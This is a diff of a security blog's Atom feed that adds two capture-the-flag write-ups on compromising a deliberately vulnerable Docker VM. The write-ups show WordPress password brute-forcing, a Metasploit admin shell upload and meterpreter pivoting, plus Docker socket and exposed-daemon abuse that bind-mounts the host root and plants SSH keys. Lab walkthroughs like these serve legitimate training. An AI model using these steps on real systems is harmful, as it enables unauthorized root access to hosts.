@@ -4,7 +4,7 @@
   <title><![CDATA[tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2015-12-29T20:17:09+00:00</updated>
+  <updated>2017-11-01T11:31:54+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,383 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Vulnerable Docker VM: Hard]]></title>
+    <link href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard/"/>
+    <updated>2017-11-01T11:20:17+00:00</updated>
+    <id>http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard</id>
+    <content type="html"><![CDATA[<p>Since this is running WordPress, the standard WPScan flags to enumerate
+information were used. Nothing relevant popped besides its users:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">[snip]</span>
+</span><span class='line'><span class="go">[+] Enumerating usernames ...</span>
+</span><span class='line'><span class="go">[+] Identified the following 1 user/s:</span>
+</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
+</span><span class='line'><span class="go">    | Id | Login | Name            |</span>
+</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
+</span><span class='line'><span class="go">    | 1  | bob   | bob _ NotSoEasy |</span>
+</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
+</span><span class='line'><span class="go">[snip]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this, brute-forcing seemed the next logical step. Used the rockyou wordlist
+to obtain the password:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">[snip]</span>
+</span><span class='line'><span class="go">+----+-------+------+----------+</span>
+</span><span class='line'><span class="go">| Id | Login | Name | Password |</span>
+</span><span class='line'><span class="go">+----+-------+------+----------+</span>
+</span><span class='line'><span class="go">|    | bob   |      | Welcome1 |</span>
+</span><span class='line'><span class="go">+----+-------+------+----------+</span>
+</span><span class='line'><span class="go">[snip]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Logging in reveals the first flag in a WordPress draft:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998</span>
+</span><span class='line'><span class="go">[snip]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decided with using Metasploit for an interactive shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">msf &gt; use exploit/unix/webapp/wp_admin_shell_upload</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set password Welcome1</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set rhost ...</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set rport 8000</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set user bob</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; run</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After unsuccessfully scouring the Web for an exploit that affected this kernel
+version, tried to horizontally escalate privileges by finding containers on the
+same user-defined network. To obtain more reliable results, a statically
+compiled nmap was sent to the machine to perform a ping sweep and a TCP scan.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 09:46 UTC</span>
+</span><span class='line'><span class="go">Cannot find nmap-payloads. UDP payloads are disabled.</span>
+</span><span class='line'><span class="go">Nmap scan report for 172.18.0.1</span>
+</span><span class='line'><span class="go">Host is up (0.00053s latency).</span>
+</span><span class='line'><span class="go">Nmap scan report for content_db_1.content_default (172.18.0.2)</span>
+</span><span class='line'><span class="go">Host is up (0.00040s latency).</span>
+</span><span class='line'><span class="go">Nmap scan report for content_ssh_1.content_default (172.18.0.3)</span>
+</span><span class='line'><span class="go">Host is up (0.00029s latency).</span>
+</span><span class='line'><span class="go">Nmap scan report for 8f4bca8ef241 (172.18.0.4)</span>
+</span><span class='line'><span class="go">Host is up (0.00025s latency).</span>
+</span><span class='line'><span class="go">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.97 seconds</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 10:02 UTC</span>
+</span><span class='line'><span class="go">Cannot find nmap-payloads. UDP payloads are disabled.</span>
+</span><span class='line'><span class="go">Nmap scan report for 172.18.0.1</span>
+</span><span class='line'><span class="go">Host is up (0.00016s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65533 closed ports</span>
+</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
+</span><span class='line'><span class="go">22/tcp   open  ssh</span>
+</span><span class='line'><span class="go">8000/tcp open  http-alt</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap scan report for content_db_1.content_default (172.18.0.2)</span>
+</span><span class='line'><span class="go">Host is up (0.00049s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65534 closed ports</span>
+</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
+</span><span class='line'><span class="go">3306/tcp open  mysql</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap scan report for content_ssh_1.content_default (172.18.0.3)</span>
+</span><span class='line'><span class="go">Host is up (0.00047s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65533 closed ports</span>
+</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
+</span><span class='line'><span class="go">22/tcp   open  ssh</span>
+</span><span class='line'><span class="go">8022/tcp open  oa-system</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap scan report for 8f4bca8ef241 (172.18.0.4)</span>
+</span><span class='line'><span class="go">Host is up (0.00015s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65534 closed ports</span>
+</span><span class='line'><span class="go">PORT   STATE SERVICE</span>
+</span><span class='line'><span class="go">80/tcp open  http</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap done: 4 IP addresses (4 hosts up) scanned in 6.19 seconds</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Scanning revealed a potential target with port 8022/tcp open. Reaching it is
+possible with meterpreter port-forwarding:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">meterpreter &gt; portfwd add -l 8192 -p 8022 -r 172.18.0.3</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Accessing it on a browser spawns a shell on the DB container as root. While
+enumerating this new container, noticed that the Docker socket is available in
+the /var/run directory, thus, giving full control of the daemon on the host.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ id</span>
+</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the vulnerable Virtual Machine wasn&rsquo;t started with NAT configured, to
+interact with the UNIX domain socket, a locally and statically compiled cURL
+was sent as base64 to the remote machine as a WordPress draft and extracted
+with the MySQL client:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ mysql -h 127.0.0.1 -u wordpress                                 \</span>
+</span><span class='line'><span class="go">    -e &#39;select post_content from wordpress.wp_posts where ID = 151&#39; \</span>
+</span><span class='line'><span class="go">    -p &gt;curl</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next a container with a host bind mount was created and started by using the
+REST API:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPOST                   \</span>
+</span><span class='line'><span class="go">    -H &#39;Content-Type: application/json&#39;                              \</span>
+</span><span class='line'><span class="go">    -d &#39;{ &quot;Image&quot;: &quot;wordpress:latest&quot;, &quot;AttachStdin&quot;: true,          \</span>
+</span><span class='line'><span class="go">    &quot;Tty&quot;: true, &quot;Entrypoint&quot;: [ &quot;/bin/sh&quot;, &quot;-c&quot; ], &quot;HostConfig&quot;: {  \</span>
+</span><span class='line'><span class="go">    &quot;Binds&quot;: [ &quot;/:/srv&quot; ] }, &quot;Cmd&quot;: [ &quot;sh &quot; ] }&#39;                     \</span>
+</span><span class='line'><span class="go">    http:/v1.24/containers/create?name=docker-root</span>
+</span><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPOST                   \</span>
+</span><span class='line'><span class="go">    -H &#39;Content-Type: application/json&#39;                              \</span>
+</span><span class='line'><span class="go">    http:/v1.24/containers/docker-root/start</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With a container created with full access to the host root directory under /srv,
+it is only a matter of creating a tarball with a SSH public key (which can be
+uploaded using the same method as above):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPUT                     \</span>
+</span><span class='line'><span class="go">    --upload-file key.tar                                             \</span>
+</span><span class='line'><span class="go">    http:/v1.24/containers/docker-root/archive?path=/srv/root/.ssh</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Connecting via SSH on the externally standard available port:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">root@vulndocker:/#</span> id
+</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+</span><span class='line'><span class="gp">root@vulndocker:/#</span> head -n1 flag_3
+</span><span class='line'><span class="go">d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vulnerable Docker VM: Easy]]></title>
+    <link href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy/"/>
+    <updated>2017-11-01T10:58:32+00:00</updated>
+    <id>http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy</id>
+    <content type="html"><![CDATA[<p>Scanning with nmap reveals that the host is exposing the Docker daemon on port
+2375/tcp. Connecting and interacting with it is possible:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> <span class="nb">export </span><span class="nv">DOCKER_HOST</span><span class="o">=</span>tcp://172.19.0.108:2375
+</span><span class='line'><span class="gp">#</span> docker version
+</span><span class='line'><span class="go">Client:</span>
+</span><span class='line'><span class="go"> Version:      17.05.0-ce</span>
+</span><span class='line'><span class="go"> API version:  1.29</span>
+</span><span class='line'><span class="go"> Go version:   go1.8.1</span>
+</span><span class='line'><span class="go"> Git commit:   v17.05.0-ce</span>
+</span><span class='line'><span class="go"> Built:        Tue May 16 10:10:15 2017</span>
+</span><span class='line'><span class="go"> OS/Arch:      linux/amd64</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Server:</span>
+</span><span class='line'><span class="go"> Version:      17.06.0-ce</span>
+</span><span class='line'><span class="go"> API version:  1.30 (minimum version 1.12)</span>
+</span><span class='line'><span class="go"> Go version:   go1.8.3</span>
+</span><span class='line'><span class="go"> Git commit:   02c1d87</span>
+</span><span class='line'><span class="go"> Built:        Fri Jun 23 21:17:13 2017</span>
+</span><span class='line'><span class="go"> OS/Arch:      linux/amd64</span>
+</span><span class='line'><span class="go"> Experimental: false</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Having direct access to the daemon is a big no-no. This gives the ability to
+execute any commands on the remote daemon, like creating a new container and
+taking advantage of the shared filesystem (-v) functionality, by bind-mounting
+the host root directory and having access to all of its files:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> docker run -v /:/srv -it --rm wordpress:latest bash
+</span><span class='line'><span class="gp">root@23890602df34:/var/www/html#</span> ls -l /srv
+</span><span class='line'><span class="go">total 80</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 17:04 bin</span>
+</span><span class='line'><span class="go">drwxr-xr-x   3 root root  4096 Aug 22 14:11 boot</span>
+</span><span class='line'><span class="go">drwxr-xr-x  14 root root  4080 Nov  1 10:26 dev</span>
+</span><span class='line'><span class="go">drwxr-xr-x  90 root root  4096 Nov  1 10:26 etc</span>
+</span><span class='line'><span class="go">-r--------   1 root root   414 Aug 21 20:30 flag_3</span>
+</span><span class='line'><span class="go">drwxr-xr-x   4 root root  4096 Aug 16 05:56 home</span>
+</span><span class='line'><span class="go">lrwxrwxrwx   1 root root    34 Aug 16 08:30 initrd.img -&gt; boot/initrd.img-3.13.0-128-generic</span>
+</span><span class='line'><span class="go">drwxr-xr-x  21 root root  4096 Aug 16 06:36 lib</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 06:36 lib64</span>
+</span><span class='line'><span class="go">drwx------   2 root root 16384 Aug 14 08:02 lost+found</span>
+</span><span class='line'><span class="go">drwxr-xr-x   3 root root  4096 Aug 14 08:03 media</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 16  2014 opt</span>
+</span><span class='line'><span class="go">dr-xr-xr-x 108 root root     0 Nov  1 10:26 proc</span>
+</span><span class='line'><span class="go">drwx------   4 root root  4096 Aug 22 14:19 root</span>
+</span><span class='line'><span class="go">drwxr-xr-x  19 root root   700 Nov  1 10:26 run</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 17:04 sbin</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 16  2014 srv</span>
+</span><span class='line'><span class="go">dr-xr-xr-x  13 root root     0 Nov  1 10:26 sys</span>
+</span><span class='line'><span class="go">drwxrwxrwt   2 root root  4096 Nov  1 10:30 tmp</span>
+</span><span class='line'><span class="go">drwxr-xr-x  10 root root  4096 Aug 14 08:02 usr</span>
+</span><span class='line'><span class="go">drwxr-xr-x  12 root root  4096 Aug 14 08:12 var</span>
+</span><span class='line'><span class="go">lrwxrwxrwx   1 root root    31 Aug 16 08:30 vmlinuz -&gt; boot/vmlinuz-3.13.0-128-generic</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since when running nmap revealed that the host is also making use of SSH, having
+the host root directory mapped, it&rsquo;s only a matter of generating a key and
+logging in to get root on the compromised host:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">root@vulndocker:~#</span> id
+</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+</span><span class='line'><span class="gp">root@vulndocker:/#</span> head -n1 /flag_3
+</span><span class='line'><span class="go">d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Protostar Stack]]></title>
